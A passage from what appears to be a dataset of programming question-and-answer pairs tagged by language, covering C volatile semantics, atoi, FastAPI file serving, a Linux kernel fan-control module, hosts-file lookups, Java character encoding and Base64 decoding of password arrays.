Evaluation of status happens before evaluation of the == operation, and
takes the form of converting that identifier to the value stored in the object it identifies (lvalue conversion, per paragraph 6.3.2.1/2).
In order to do anything with the value stored in status at that time, that value must first be read.  


The standard does not require a volatile object to reside in addressable storage, so in principle, your volatile automatic variable could be assigned exclusively to a register.  In that event, as long as machine instructions using that object either read its value directly from its register or make updates directly to its register, no separate loads or stores would be required to achieve proper volatile semantics.  Your particular object does not appear to fall into this category, however, because the store instruction in your generated assembly seems to indicate that it is, indeed, associated with a location in memory.
Moreover, if the program correctly implemented volatile semantics for an object assigned to a register, then that register would have to be r0.  I'm not familiar with the specifics of this assembly language and the processor on which the code runs, but it certainly does not look like r0 is a viable locus for such storage.
With that being the case I agree that status should have been read back from memory, and it should be read back from memory again if its second appearance in the conditional expression needs to be evaluated.  This is the behavior of the abstract machine, which conforming implementations exhibit with respect to all volatile accesses.  My analysis, then, is that your implementation is non-conforming in this regard, and I would be inclined to report that as a bug.
As for a workaround, I think your best bet as to write the important bits in assembly -- inline assembly if your implementation supports that, or as a complete function implemented in assembly if necessary.
",c
is the atoi function really efficient to compare an integer and a string,"I'm currently trying to make a function containing an ""if"" sequence.The condition of this if is linked to command line arguments as my function should only if the third command line argument passed is the number '0'. My current problem is that the atoi() function return 0 in case of failure making my function works even when the third arguments is a letter or a random character.That's why i'm wondering if the problem is the atoi() function or my lack of comprehension about command line arguments.
Here is an example of my code:
int encryption_case(int ac, char **av)
{
    if(atoi(av[3]) == 0){
         print_matrix(av[2]);
    } else {
    exit (84);
    }
}

I also tried working without the atoi function but the comparison between av and a number is tricky for me.I would greatly appreciate even if not the direct answer to be redirect to a website to solidify my basics in c.
","Using atoi to test whether a string is “0” is inefficient.
Whether a C string is “0” is determined by:

The first byte is '0'.
The second byte is zero.

This is fundamentally a test of two bytes or, if the platform permits, a test of 16 bits, and so it should be an operation that is at most loading a byte, comparing it, branching based on the result, loading a second byte, comparing it, and branching based on the result. In contrast, atoi involves a function call, establishing a stack frame, possibly initializing local data in preparation for numerical conversion work, loading the first byte, checking whether it is a white space character, then checking whether it is  “-” or a digit, and so on, followed by popping the stack frame and returning. It is almost certainly more work than the simple string comparison required.

… the comparison between av and a number is tricky for me.

We can perform the test described above this way:
const char *p = av[3];           // Save av[3] in a pointer for convenience.
if (p[0] == '0' && p[1] == '\0') // Test for “0” digit followed by null character.
    print_matrix(av[2]);
…

We could also use the strcmp function in the standard C library:
#include <string.h>

…

if (0 == strcmp(av[3], ""0""))
    print_matrix(av[2]);
…

That nominally involves a function call and so may be less efficient than the manual test. However, with -O3, both Clang and GCC compile it to a direct test of the two bytes, at least for some target platforms.
",c
how to make a large file accessible to external apis,"I'm new to webdev, and I have this use case where a user sends a large file (e.g., a video file) to the API, and then this file needs to be accessible to other APIs (which could possibly be on different servers) for further processing.
I'm using FastAPI for the backend, defining a file parameter with a type of UploadFile to receive and store the files. But what would be the best way to make this file accessible to other APIs? Is there a way I can get a publicly accessible URL out of the saved file, which other APIs can use to download the file?
","Returning a File Response
First, to return a file that is saved on disk from a FastAPI backend, you could use FileResponse (in case the file was already fully loaded into memory, see here). For example:
from fastapi import FastAPI
from fastapi.responses import FileResponse

some_file_path = ""large-video-file.mp4""
app = FastAPI()

@app.get(""/"")
def main():
    return FileResponse(some_file_path)

In case the file is too large to fit into memory—as you may not have enough memory to handle the file data, e.g., if you have 16GB of RAM, you can't load a 100GB file—you could also use StreamingResponse instead. That way, you don't have to read the entire contents into memory at once, but, instead, read them in chunks, thus processing the data one chunk at a time. It should be noted, though, that FileResponse, as shown in the FileResponse class implementation, reads the file contents into memory in chunks as well; hence, there would be no memory issues with using FileResponse either. However, as can be seen in the implementation, FileResponse uses a pre-defined chunk size of 64KB. Thus, if you wished choosing a larger chunk size, you could instead use StreamingResponse and specify the chunk size as desired, as demonstrated in this answer, or use yield from f, as shown below (but, this might be somewhat slower, always depending on your needs).
from fastapi import FastAPI
from fastapi.responses import StreamingResponse

some_file_path = ""large-video-file.mp4""
app = FastAPI()

@app.get(""/"")
def main():
    def iterfile():
        with open(some_file_path, mode=""rb"") as f:
            yield from f

    return StreamingResponse(iterfile(), media_type=""video/mp4"")

Exposing the API to the public
As for exposing your API to the public—i.e., external APIs, users, developers, etc.—you can use ngrok (or expose, as suggested in this answer).
Ngrok is a cross-platform application that enables developers to expose a local development server to the Internet with minimal effort. To embed the ngrok agent into your FastAPI application, you could use pyngrok—as suggested here (see here for a FastAPI integration example). If you would like to run and expose your FastAPI app through Google Colab (using ngrok), instead of your local machine, please have a look at this answer (plenty of tutorials/examples can also be found on the web).
If you are looking for a more permanent solution, you may want to have a look at cloud platforms—more specifically, a Platform as a Service (PaaS). I would strongly recommend you thoroughly read FastAPI's Deployment documentation. Have a closer look at About HTTPS and Deployments Concepts.
Important Notes
By exposing your API to the outside world, you are also exposing it to various forms of attack. Before exposing your API to the public—even if it’s for free—you need to make sure you are offering secure access (use HTTPS), as well as authentication (verify the identity of a user) and authorization (verify their access rights; in other words, verify what specific routes, files and data a user has access to)—take a look at 1. OAuth2 and JWT tokens, 2. OAuth2 scopes, 3. Role-Based Access Control (RBAC), 4. Get Current User and How to Implement Role based Access Control With FastAPI.
Addtionally,  if you are exposing your API to be used publicly, you may want to limit the usage of the API because of expensive computation, limited resources, DDoS attacks, Brute-force attacks, Web scraping, or simply due to monthly cost for a fixed amount of requests. You can do that at the application level using, for instance, slowapi (related post could be found  here), or at the platform level by setting the rate limit through your hosting service (if permitted). Furthermore, you would need to make sure that the files uploaded by users have the permitted file extension, e.g., .mp4, and are not files with, for instance, a .exe extension that are potentially harmful to your system. Also, you should rather give your own filenames and keep track of them (associate them with user accounts), when saving the user's uploaded files to disk, by generating unique random UUIDs, for instance. In this way, you would avoid filename clashes, as well as ensure that unauthorized users could not have access to whatever file(name) they may request—it might also be a good idea to create a different disk space/directory for each user, where their files will be stored and separate from others.
Finally, you would also need to ensure that the uploaded files do not exceed a predefined MAX_FILE_SIZE limit (based on your needs and system's resources), so that authenticated users, or an attacker, would be prevented from uploading extremely large files that would result in consuming server resources in a way that the application may end up crashing. You shouldn't rely, though, on the Content-Length header being present in the request to do that, as this might be easily altered, or even removed, by the client. You should rather use an approach similar to this answer (have a look at the ""Update"" section) that uses request.stream() to process the incoming data in chunks as they arrive, instead of loading the entire file into memory first. By using a simple counter, e.g., total_len += len(chunk), you can check if the file size has exceeded the MAX_FILE_SIZE, and if so, raise an HTTPException with HTTP_413_REQUEST_ENTITY_TOO_LARGE status code (see this answer as well, for more details and code examples).
Read more on FastAPI's Security documentation and API Security on Cloudflare.
",python
save file directly to specified path without showing save or open dialogue,"I'm invoking javascript in a web page using
webBrowser2.Document.InvokeScript(""download_file"");`. 

This javascript opens dialogue asking user to save or open the file. I want to save the file directly to the path without showing the dialogue to user. How can i achieve this. I'm scraping the web page. I'm extracting the required details from the web page.
download_file():
function download_file() {
    var summaryFlag = 0;
    if (document.getElementById(""frmincludefilesummary"").checked) {
        summaryFlag = 1;
    }
    url = '/filedatabase/file_process_request.html?mru=53616c7&type=doc';
    url += '&sum=' + summaryFlag + '&logo=0&xcode=name&serve_txt=0&folderid=';
    document.location = url;
}​

","The thing you are trying to achieve is not possible. Javascript cannot access or write to the client filesystem directly. If allowed it would be a huge security breach.
Alternate options would be to make use of flash or java or activeX.
",javascript
my linux kernel module to control fan speeds and rgb keyboard of acer nitro 16 causes kernel panic,"I'm writing a kernel module for controlling the fans and RGB keyboard of Acer Nitro 16. The code, works very well but I have a problem: after some time I insert the module with insmod, my computer freezes (I'm sure about it's kernel panic, because of often the caps lock light starts to blink). When I check the dmesg log, it says General protection fault, after a bit of research, I saw people was said it can be caused by faulty memory module on arch forums, but I'm sure about my memory modules are clean, without the kernel module there is no problem.
My Code:
#include ""acer_nitro_gaming_driver2.h""
#include ""linux/fs.h""
#include ""linux/init.h""
#include ""linux/kdev_t.h""
#include ""linux/kern_levels.h""
#include ""linux/kstrtox.h""
#include ""linux/printk.h""
#include ""linux/wmi.h""

MODULE_LICENSE(""GPL"");
static int cmajor= 0;

static struct class *cclass=NULL;
dev_t cdev;
static const struct file_operations cfops={
    .owner=THIS_MODULE,
    .write= cdev_user_write,
    .open= chdev_open,
    .release= chdev_release

};
struct chdev_data{
    struct cdev cdev;
};
static struct chdev_data cdev_data[2];
extern int chdev_uevent(const struct device *dev,struct kobj_uevent_env *env){
    add_uevent_var(env, ""DEVMODE=%#o"",0666);
    return 0;
}

void cdev_create(char * name, int major, int minor,  struct class *class){
    cdev_init(&cdev_data[minor].cdev,&cfops);
    cdev_data[minor].cdev.owner = THIS_MODULE;
    cdev_add(&cdev_data[minor].cdev,MKDEV(major,minor),1);
    device_create(class,NULL,MKDEV(major,minor),NULL,name);
}
ssize_t cdev_user_write(struct file * file,const char __user * buff, size_t count, loff_t *offset){
    int cdev_minor = MINOR(file->f_path.dentry->d_inode->i_rdev);
    printk(KERN_INFO""writing to : %d"",cdev_minor);
    char * kbfr=kmalloc(count,GFP_KERNEL);
    kbfr[strlen(kbfr)-1]='\0';
    int ispeed =0;
    copy_from_user(kbfr,buff,count);
    if(kbfr==NULL)
        return -ENOMEM;
    printk(KERN_INFO""%s"",kbfr);
    switch(cdev_minor){
        case 0:
            printk(KERN_INFO""CPUFAN"");
            kstrtoint(kbfr,10 ,&ispeed );
            fan_set_speed(ispeed,1 );
            break;
        case 1:
            printk(KERN_INFO""GPUFAN"");
            kstrtoint(kbfr,10 ,&ispeed );
            fan_set_speed(ispeed,4 );
            break;
    }
    return count;
}
extern int chdev_open(struct inode * inode,struct file * file){
    try_module_get(THIS_MODULE);
    return 0;
}

extern int chdev_release(struct inode * inode,struct file * file){
    module_put(THIS_MODULE);
    return 0;
}
//Wmi Driver Definition
static struct wmi_device *w_dev ;

struct driver_data_t{};

static const struct wmi_device_id w_dev_id[] = {{
    .guid_string = WMI_GAMING_GUID
},
};

static struct wmi_driver wdrv = {
    .driver = {.owner = THIS_MODULE, .name = DRV_NAME, .probe_type=PROBE_PREFER_ASYNCHRONOUS},
    .id_table = w_dev_id,
    .remove = wmi_remove,
    .probe = wmi_probe,

};
void wmi_remove(struct wmi_device *w_devv) { w_dev = NULL; }

extern int wmi_probe(struct wmi_device *wdevv, const void *notuseful) {
    struct driver_data_t *driver_data;
    if(!wmi_has_guid(WMI_GAMING_GUID))
        return -ENOMEM;
    driver_data =
        devm_kzalloc(&wdevv->dev, sizeof(struct driver_data_t), GFP_KERNEL);
    dev_set_drvdata(&wdevv->dev,driver_data );
    w_dev = wdevv;
    //Unlock the fan speeds
    wmi_eval_int_method(14,7681 );
    wmi_eval_int_method(14,1638410 );
    //Set fan speeds to 512
    wmi_eval_int_method(16,5121 );
    wmi_eval_int_method(16,5124 );
    dy_kbbacklight_set(1, 5, 100, 1, 255, 0, 0);
    return 0;
}
//Wmi Functions
extern void __wmi_eval_method(struct wmi_device * wdev,int methodid ,int instance ,struct acpi_buffer *inbuffer){
    struct acpi_buffer out = {ACPI_ALLOCATE_BUFFER, NULL};
    wmidev_evaluate_method(wdev,instance ,methodid ,inbuffer ,&out );
}
extern void wmi_eval_method(int methodid,struct acpi_buffer inputacpi){
    __wmi_eval_method(w_dev,methodid ,0 ,&inputacpi );
}
extern void wmi_eval_int_method(int methodid,int input){
    struct acpi_buffer in = {(acpi_size)sizeof(input),&input};
    wmi_eval_method(methodid,in );
}
//Concatenate Function*
//Thanks to: https://stackoverflow.com/questions/12700497/how-to-concatenate-two-integers-in-c

unsigned concatenate(unsigned x, unsigned y) {
    unsigned pow = 10;
    while(y >= pow)
        pow *= 10;
    return x * pow + y;
}
//Set Fan Speeds

extern int fan_set_speed(int speed ,int fan ){
    int merged=  concatenate(speed,fan);
    printk(KERN_INFO""%d"",merged);
    wmi_eval_int_method(16,merged );
    return 0;
}
//Keyboard RGB Led
extern void dy_kbbacklight_set(int mode, int speed, int brg, int drc, int red, int green, int blue){
    u8 dynarray [16] = {mode, speed, brg, 0, drc, red, green, blue, 0, 1, 0, 0, 0, 0, 0, 0};
    struct acpi_buffer in  = {(acpi_size)sizeof(dynarray),dynarray};
    wmi_eval_method(20,in);
}
int module_startup(void){
    if(!wmi_has_guid(WMI_GAMING_GUID))
        return -ENODEV;
    if(alloc_chrdev_region(&cdev,0 ,2 ,""acernitrogaming"" )<0)
        return -ENXIO;
    cmajor = MAJOR(cdev);
    cclass = class_create(""acernitrogaming"");
    cclass->dev_uevent=chdev_uevent;
    cdev_create(""fan1"",cmajor ,0,cclass );
    cdev_create(""fan2"",cmajor ,1,cclass );
    wmi_driver_register(&wdrv);

    printk(""Acer Nitro Gaming Functions Wmi Driver Module was loaded"");
    return 0;
}
void module_finish(void){
    printk(""Acer Nitro Gaming Functions Wmi Driver Module was unloaded"");
    device_destroy(cclass, MKDEV(cmajor,0));
    device_destroy(cclass, MKDEV(cmajor,1));
    class_destroy(cclass);
    unregister_chrdev_region(MKDEV(cmajor,0 ),MINORMASK );
    wmi_driver_unregister(&wdrv);

}

module_init(module_startup);
module_exit(module_finish);

Logs:
Oops: general protection fault, probably for non-canonical address 0x1cff96aa80deee40: 0000 [#1] PREEMPT SMP NOPTI

CPU: 10 UID: 1000 PID: 2070 Comm: Xwayland Tainted: POE 6.12.9-zen1-1-zen #1 3932de41e0e2f413f8ccd21a06
c6e6c1ba8fb994

RIP: 0010:__kmalloc_noprof+0x10b/0x3f0

Code: 73 e6 99 59 48 8b 50 08 48 83 78 10 00 48 8b 38 0f 84 47 02 00 00 48 85 ff 0f 84 3e 02 00 00 41 8b 45 28 49 8b 7500 48 01 f8 <48> 8b 18 48 89 c1 49 33 9d b8 00 00 00 48 89 f8 48 0f c9 48 31 cb

","The lines
char * kbfr=kmalloc(count,GFP_KERNEL);
kbfr[strlen(kbfr)-1]='\0';
int ispeed =0;
copy_from_user(kbfr,buff,count);
if(kbfr==NULL)
    return -ENOMEM;

Should be changed to:
#include <fortify-string.h>

char * kbfr=kmalloc(count,GFP_KERNEL);
int ispeed =0;
if(kbfr==NULL)       // Check before copy
    return -ENOMEM;
copy_from_user(kbfr,buff,count);
int ix = strnlen(kbfr, count);
if (ix > 0)          // check for 0
    kbfr[ix-1] = '\0';   // always terminate

",c
eclipse shows errors but i can39t find them,"I am trying to run my project, but Eclipse is saying I have errors. But there are no errors, just a red cross where the project name is. I have tried deleting the R.java and generating a new one, but that didn't work.
","Based on the error you showed ('footballforum' is missing required Java project: 'ApiDemos'), I would check your build path.  Right-click the footballforum project and choose Build Path > Configure Build Path.  Make sure ApiDemos is on the projects tab of the build path options. 
",java
how to stop adblocks from blocking my revive adserver banner promotions,"I am using revive adserver to show my users promotions banners and track conversion. The problem is that adblock completely blocks my banners. I would like to change my banner code so that my users who are using adblock still will be able to know about promotions. 
","This is very complicated because new filters are being written and available every day. However, removing any code or markup and signifies that your ad is an ad can help.
Ie. Remove word like: ad, popup, banner, giveaway, etc.
Further, the best way is to determine what filter is blocking your ad, then alter the ad so that it isn't matched. Although if the site serving the ad has a lot of traffic a new filter will be written very quickly, and then at that point it's just a you against the world. So it's sort of pointless to even try.
An ad is an ad and will eventually be blocked.
",javascript
using standard c library function on arm64 macos assembly doesn39t work after linking,"I'm on MacOS (Apple Silicon M4 processor, so, ARM64), and when trying to use puts from the standard C library:
    .global main                                                        // 1 
main:                                                                   // 2 
    stp     x21, x30, [sp, -16]!    // push onto stack                  // 3 
    mov     x21, x1                 // argc -> x0, argv -> x1           // 4 
                                                                        // 5 
top:                                                                    // 6 
    ldr     x0, [x21], 8            // argv++, old value in x0          // 7 
    cbz     x0, bottom              // if *argv == NULL goto bottom     // 8 
    bl      puts                    // puts(*argv)                      // 9 
    b       top                     // goto top                         // 10 
                                                                        // 11 
bottom:                                                                 // 12 
    ldp     x21, x30, [sp], 16      // pop from stack                   // 13 
    mov     x0, xzr                 // return 0                         // 14 
    ret                                                                 // 15 
                                                                        // 16 
    .end                       

It fails, and returns:
~/ clang -lc -arch arm64 test2.s -e main                                                                                               

Undefined symbols for architecture arm64:
  ""puts"", referenced from:
      main in test2-8965bb.o
ld: symbol(s) not found for architecture arm64
clang: error: linker command failed with exit code 1 (use -v to see invocation)


I have tried with the addition of the -lSystem flag, doesn't work, instead just returns a ld: warning: ignoring duplicate libraries: '-lSystem' warning.
Not sure what I did wrong, making it that I can't use libc (just in case, I have tried this:
#include <stdio.h>

int main(){
  puts(""Hello, World!"");
  return 0;
}

Whos assembly equivalent is:
    .section    __TEXT,__text,regular,pure_instructions
    .build_version macos, 15, 0 sdk_version 15, 2
    .globl  _main                           ; -- Begin function main
    .p2align    2
_main:                                  ; @main
    .cfi_startproc
; %bb.0:
    sub sp, sp, #32
    stp x29, x30, [sp, #16]             ; 16-byte Folded Spill
    add x29, sp, #16
    .cfi_def_cfa w29, 16
    .cfi_offset w30, -8
    .cfi_offset w29, -16
    mov w8, #0                          ; =0x0
    str w8, [sp, #8]                    ; 4-byte Folded Spill
    stur    wzr, [x29, #-4]
    adrp    x0, l_.str@PAGE
    add x0, x0, l_.str@PAGEOFF
    bl  _puts
    ldr w0, [sp, #8]                    ; 4-byte Folded Reload
    ldp x29, x30, [sp, #16]             ; 16-byte Folded Reload
    add sp, sp, #32
    ret
    .cfi_endproc
                                        ; -- End function
    .section    __TEXT,__cstring,cstring_literals
l_.str:                                 ; @.str
    .asciz  ""Hello, World!""

.subsections_via_symbols

Which works just fine!)
Some help would be appreciated!
","As @Shawn and @fuz mentioned, adding a prefixing _ is required for all C code built for the macOS ABI.
Therefore, the corrected code would become:
    .global main                                                        // 1 
main:                                                                   // 2 
    stp     x21, x30, [sp, -16]!    // push onto stack                  // 3 
    mov     x21, x1                 // argc -> x0, argv -> x1           // 4 
                                                                        // 5 
top:                                                                    // 6 
    ldr     x0, [x21], 8            // argv++, old value in x0          // 7 
    cbz     x0, bottom              // if *argv == NULL goto bottom     // 8 
    bl      _puts                   // note that there is a `_`         // 9   
    b       top                     // goto top                         // 10 
                                                                        // 11 
bottom:                                                                 // 12 
    ldp     x21, x30, [sp], 16      // pop from stack                   // 13 
    mov     x0, xzr                 // return 0                         // 14 
    ret                                                                 // 15 
                                                                        // 16 
    .end         

Fixed part:
bl    _puts  // with the addition of the leading `_` 

",c
typedef did not replaced with the datatype,"I was surprised with the following piece of code,
#include<stdio.h>
typedef int type;

int main( )
{
    type type = 10;
    printf( ""%d"", type );
}

This went through and output of the program is 10.
But when I changed the code slightly as below,
#include<stdio.h>
typedef int type;

int main()
{
    type type = 10;
    float f = 10.9898;
    int x;
    x = (type) f;
    printf( ""%d, %d"", type, x);
}

in aCC compiler:

""'type' is used as a type, but has not been defined as a type."" 

in g++ compiler:

""error: expected `;' before f""

Is it that the compiler did not recognize the pattern in the second case, as this pattern can be related to assignment of a variable, evaluation of an expression etc and in the first case as this pattern is only used while defining a variable compiler recognized it.
","typedef identifiers, like variable names, also has a scope. After
type type = 10;

the variable type shadows the type name type. For instance, this code
typedef int type;
int main( )
{
    type type = 10;
    type n;   //compile error, type is not a type name
}

won't compile for the same reason, in C++, you can use ::type to refer to the type name:
typedef int type;
int main( )
{
    type type = 10;
    ::type n;  //compile fine
}

",c
add a timeout for getchar,"I need to add a timeout function for getchar() in my program. 
What do I do so that when my program reaches the instruction getchar(), it will only wait for a certain amount of time for the user to make a keystroke and if the user does not make a keystroke within the given time limit, the program will ""skip"" the getchar()?
The operating system does not support the conio.h library so kbhit is not an option.
","This is usually achieved by using select() on stdin. Another solution would be using alarm() and a dummy SIGALRM handler to interrupt the getchar() call (only working on POSIX systems though).
",c
resolve hostnames using etchosts only,"I'm trying to resolve a hostname to an IP address using the /etc/hosts file only.
That is, if the name cannot be locally resolved, it must fail (ie. no DNS request sent out).
The standard way to resolve a name is with getaddrinfo, but this will fallback to DNS.
gethostent_r seems a good candidate since it returns records from the local hosts file, but unfortunately, I do not get IPv6 records, only IPv4.
How can I resolve a name to an IPv4 or IPv6 address based on the local /etc/hosts file only ?
","
gethostent_r seems a good candidate since it returns records from the local hosts file, but unfortunately, I do not get IPv6 records, only IPv4.

That doesn't sound right to me. It should return both types, assuming they are actually in /etc/hosts – but it will likely return them as two separate entries, as it goes through the file line-by-line.
Other methods:
If you are using glibc, you might be able to call __nss_configure_lookup(""hosts"", ""files"") – an internal glibc function which the getent tool uses to implement its -s option (as in {""getent"", ""-s"", ""hosts"", arg}).
A slightly better method, also for glibc, is to directly dlopen() the corresponding libnss ""backend"" module that is responsible for providing hostname lookup from /etc/hosts; that is, libnss_files.so.2. The interface between glibc and the libnss modules is a bit messy (especially the several different ""hostname"" functions), but it is stable.
Either of those might be preferable to writing your own parser, although not due to CPU usage – rather, due to the high chance that your custom parser will be incomplete and won't match the way glibc itself parses /etc/hosts. Make sure to test your parser with multiple address mappings for the same name; multiple names for the same address; mixed IPv4 and IPv6 mappings for the same name; etc. Otherwise users/sysadmins may be very annoyed.

it takes more CPU time for something the system has already done

The system hasn't really ""already done"" it. On most Linux systems there is no central cache for /etc/hosts; it is parsed independently by each process. (Some systems might have the 'nscd' general-purpose name-lookup cache daemon running but it's uncommon.) So if you do gethostbyname() and let libc read /etc/hosts, that's really the same as parsing it yourself.
",c
how to create a driver for a database with a opensource language,"Some opensource language don't have all the driver for all the database like memcache etc.So I want to write a driver for them.But I don't know how to do it.Where can I start?
","A few ways to do this.

Use the language's foreign function interface to wrap an existing driver.  This is usually the quickest route, but the resulting API may be clumsy or unnatural, and it will be hard to take advantage of language features.
Read the memcached protocol spec and write the driver.  This works well for simple protocols and allows you to write drivers that use all of the features of the language (such as asynchronous IO, for example).  However, this can be a lot of work if the protocol is not simple.
Port an existing driver to the target language.  This works well if there is an existing driver for a similar language (e.g., Java and C# are similar).

I ranked these techniques in rough order of how common they are.  Sometimes, as a language matures and its community grows, FFI libraries (#1) get replaced by native libraries (#2).  
",c
count how often an element in a list of dicts is unequal to quotxquot,"I have list of dicts.
Each dict has the same items with a different value. It is a question code with the answer.
So question ""a"" can be answerd with a scale of 1-7. If you do not want to answer that question, it is an ""X"" in the answer sheet.
example:
[
{""a"":1,""b"":2,""c"":""X""},
{""a"":1,""b"":""X"",""c"":3},
{""a"":1,""b"":2,""c"":""X""}
]

My goal is to know, if there is any question, that has less than 5 or more than 50 valid answers. A valid answer is anything except ""X"".
So I need to count now, how often any item is not equal ""X"".
In that case, for ""a"" it would be 3, for ""b"" it would be 2 and for ""c"" it would be 1.
I could loop through it.
Make an array for each item in the dicts. Then loop trough the list, inside that loop through the dict and add +1 to the item in the array. Afterwards check the counter, if there is any item < 5 or > 50.
But there is probably some sweet python code (as always) that does this in like 3 lines. While my loop would probably be 5 times bigger.
And is faster. I have to repeat that check a few thousand times. So speed is kinda important. Not super duper important, but nice to have
","As everything is loaded in memory, I would just iterate the keys, counting the number of 'X' per key. Assuming your list of dictionary is ld I would try:
keys = ld[0].keys()    # ignore this if you already have a list of the keys
missing = {k: sum(d[k] == 'X' for d in ld) for k in keys}

With your sample data, it returns - as expected:
{'a': 0, 'b': 1, 'c': 2}

Of course this only makes sense if no dictionary after the first one contains a new key...
",python
goldbach conjecture exercise c,"My professor asked me to do a program to test the Goldbach conjecture. I am wondering if I should consider 1 as a prime. This is my code that prints the first combination of prime numbers:
#include <stdio.h>
#include <stdlib.h>
#include <math.h>

int main()
{
    int n, i, j, k, l;    
    char prime, prime1;
    do   //check if n is even and greater than 2
    {
        printf(""Give me an even natural number greater than 2:\n\n>"");
        scanf(""%d"", &n);
    }
    while (n % 2 != 0 && n >= 2);
    for (i = 1; i < n ; i++) 
    {                   
        prime = 1;     
        for (k = 2; k < i; k++)  
            if (i % k == 0)
                prime = 0;
        if (prime)
        {
            for (j = 1; j < n; j++)
            {
                prime1 = 1;
                for (l = 2; l < j; l++)
                    if (j % l == 0)
                        prime1 = 0;
                if (prime1)
                    if (i + j == n)
                    {
                        printf(""\n\n%d and %d are the first two prime numbers that add up to %d.\n"", i, j, n);
                        return 0;
                    }
            }
        }
    }
}

I checked the internet and almost everyone says that 1 is not a prime. What should i do? Keep the program as it is or change it so that it won't consider 1 as a prime? And how do I do that? :P
","you can consider 1 a prime number, as Goldbach did, or not as is the more common usage, it makes almost no difference regarding the conjecture.
Considering 1 as a prime number has this effect:

there is a solution for 2: 1 + 1.
the first pair for 4 is 1 + 3 instead of 2 + 2
the first solution for higher even numbers may involve 1 if the value is a prime number plus one, but no known even number greater than 2 can only be expressed as p + 1.

Note that there are problems in your code:

you do not check the return value of scanf(), so inputing a string that is not a number will cause undefined behavior (the first time as n is uninitialized) or an infinite loop as n is no longer modified.
the test while (n % 2 != 0 && n >= 2); is incorrect: it should be:
while (n <= 2 || n % 2 != 0);

the first loop could iterate half as long with a test i <= n / 2
the second loop could iterate much less with a test k * k <= i
you could exit the second loop when you detect that i is not prime
there is no need for a third loop, you just need to test if n - i is prime
the same improvements are possible for the second primary test, better move this to a separate function.
you should have a message and return statement for the remote possibility that you find a counter-example to the Goldbach conjecture ;-)

Here is an improved version:
#include <stdio.h>

#define PRIME_MASK ((1ULL <<  2) | (1ULL <<  3) | (1ULL <<  5) | (1ULL <<  7) |\
                    (1ULL << 11) | (1ULL << 13) | (1ULL << 17) | (1ULL << 19) | \
                    (1ULL << 23) | (1ULL << 29) | (1ULL << 31) | (1ULL << 37) | \
                    (1ULL << 41) | (1ULL << 43) | (1ULL << 47) | (1ULL << 53) | \
                    (1ULL << 59) | (1ULL << 61))

int isprime(unsigned long long n) {
    if (n <= 63)
        return (PRIME_MASK >> n) & 1;
    if (n % 2 == 0)
        return 0;
    for (unsigned long long k = 3; k * k <= n; k += 2) {
        if (n % k == 0)
            return 0;
    }
    return 1;
}

int main(void) {
    unsigned long long n, i;
    int r;

    for (;;) {
        printf(""Give me an even natural number greater than 2:\n>"");
        r = scanf(""%llu"", &n);
        if (r == 1) {
            if (n % 2 == 0 && n > 2)
                break;
        } else
        if (r == EOF) {  /* premature end of file */
            return 1;
        } else {
            scanf(""%*[^\n]%*c"");  /* flush pending line */
        }
    }
#ifdef ONE_IS_PRIME
    i = 1;    /* start this loop at 1 if you want to assume 1 is prime */
#else
    i = (n == 4) ? 2 : 3;
#endif
    for (; i <= n / 2; i += 2) {
        if (isprime(i) && isprime(n - i)) {
            printf(""%llu = %llu + %llu\n"", n, i, n - i);
            return 0;
        }
    }
    printf(""Goldbach was wrong!\n""
           "" %llu cannot be written as the sum of two primes\n"", n);
    return 0;
}

",c
simplestcleanest way to implement a singleton in javascript,"What is the simplest/cleanest way to implement the singleton pattern in JavaScript?
","I think the easiest way is to declare a simple object literal:
var myInstance = {
  method1: function () {
    // ...
  },
  method2: function () {
    // ...
  }
};

If you want private members on your singleton instance, you can do something like this:
var myInstance = (function() {
  var privateVar = '';

  function privateMethod () {
    // ...
  }

  return { // public interface
    publicMethod1: function () {
      // All private members are accessible here
    },
    publicMethod2: function () {
    }
  };
})();

This has been called the module pattern, and it basically allows you to encapsulate private members on an object, by taking advantage of the use of closures.
If you want to prevent the modification of the singleton object, you can freeze it, using the ES5 Object.freeze method.
That will make the object immutable, preventing any modification to the its structure and values.
If you are using ES6, you can represent a singleton using ES Modules very easily, and you can even hold private state by declaring variables at the module scope:
// my-singleton.js
const somePrivateState = []

function privateFn () {
  // ...
}

export default {
  method1() {
    // ...
  },
  method2() {
    // ...
  }
}

Then you can simply import the singleton object to use it:
import myInstance from './my-singleton.js'
// ...

",javascript
isn39t the size of character in java 2 bytes,"I used RandomAccessFile to read a byte from a text file.
public static void readFile(RandomAccessFile fr) {
    byte[] cbuff = new byte[1];
    fr.read(cbuff,0,1);
    System.out.println(new String(cbuff));
}

Why am I seeing one full character being read by this?
","A char represents a character in Java (*). It is 2 bytes large (or 16 bits).
That doesn't necessarily mean that every representation of a character is 2 bytes long. In fact many character encodings only reserve 1 byte for every character (or use 1 byte for the most common characters).
When you call the String(byte[]) constructor you ask Java to convert the byte[] to a String using the platform's default charset (pre Java 18)(**). Since the platform default charset is usually a 1-byte encoding such as ISO-8859-1 or a variable-length encoding such as UTF-8, it can easily convert that 1 byte to a single character.
If you run that code on a platform that uses UTF-16 (or UTF-32 or UCS-2 or UCS-4 or ...) as the platform default encoding, then you will not get a valid result (you'll get a String containing the Unicode Replacement Character instead).
That's one of the reasons why you should not depend on the platform default encoding: when converting between byte[] and char[]/String or between InputStream and Reader or between OutputStream and Writer, you should always specify which encoding you want to use. If you don't, then your code will be platform-dependent.
(*) that's not entirely true: a char represents a UTF-16 code unit. Either one or two UTF-16 code units represent a Unicode code point. A Unicode code point usually represents a character, but sometimes multiple Unicode code points are used to make up a single character. But the approximation above is close enough to discuss the topic at hand.
(**) Note that on Android the default character set is always UTF-8 and starting with Java 18 the Java platform itself also switched to this default (but it can still be configured to act the legacy way)
",java
securely decoding a base64 character array in java,"I need to decode a Base64 char array without converting it to a String. The char array is a password, and for security reasons I am not allowed to convert it to a String (this requirement is non-negotiable).
The java.util.Base64.Decoder.decode method accepts byte[], ByteBuffer, and String, but not char[].
Security concerns of using a String to store sensitive data
per Jim Archer's comment

Strings are immutable
They can only be purged from memory by the Garbage Collector (which cannot be forced to do it)

","Create a CharBuffer backed by the char[]. Then use Charset.encode to encode the byte buffer into a ByteBuffer. A ByteBuffer is accepted by the Base64 Decoder.
private static final java.util.Base64.Decoder BASE_64_DECODER = java.util.Base64.getDecoder(); // Initializes a Decoder instance with getDecoder() method

private static final String ENCODING = ""UTF-8"";// Use the correct encoding here.

private byte[] decodePassword(char[] password) {
    CharBuffer charBuffer = CharBuffer.wrap(password);
    ByteBuffer byteBuffer = Charset.forName(ENCODING).encode(charBuffer);
    return BASE_64_DECODER.decode(byteBuffer);
}

Inspired by azurefox's comment and the answer here: https://stackoverflow.com/a/9670279/1361506
